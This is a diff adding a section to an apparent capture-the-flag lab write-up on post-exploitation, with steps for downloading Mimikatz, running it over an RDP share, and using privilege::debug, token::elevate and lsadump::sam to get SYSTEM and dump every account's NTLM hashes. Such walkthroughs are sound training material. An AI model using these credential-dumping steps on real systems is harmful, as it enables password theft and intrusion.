@@ -170,6 +170,44 @@ Run `whoami /groups`
 
 Good. We now have admin on this machine.
 
+---
+
+## Task 7 Attack Post Exploitation 
+
+---
+**Answer the questions below**
+
+- First up, let's get an up-to-date copy of Mimikatz to our attacking machine.
+Go to https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20210810-2 and download `mimikatz_trunk.zip`
+Make sure that the zip file is in your /tmp directory, then unzip it with unzip mimikatz_trunk.zip.
+
+On RPD:
+
+`\\tsclient\share\x64\mimikatz.exe`
+
+Then, with mimikatz open:
+
+`privilege::debug`
+
+> this obtains debug privileges which allows us to access other processes for "debugging" purposes.
+
+`token::elevate`
+
+> takes us from our administrative shell with high privileges into a SYSTEM level shell with maximum privileges
+
+![image](https://user-images.githubusercontent.com/86648102/135429820-ea30492a-d8c0-4b6b-97f5-996b41d9371a.png)
+
+
+
+# What is the Administrator account's NTLM password hash?
+
+Found in the output of :
+
+`lsadump::sam`
+
+> this will provide us with a list of password hashes for every account on the machine
+
+![image](https://user-images.githubusercontent.com/86648102/135430241-41c128b6-e617-4187-9dac-350418c37c0c.png)
 
 
 
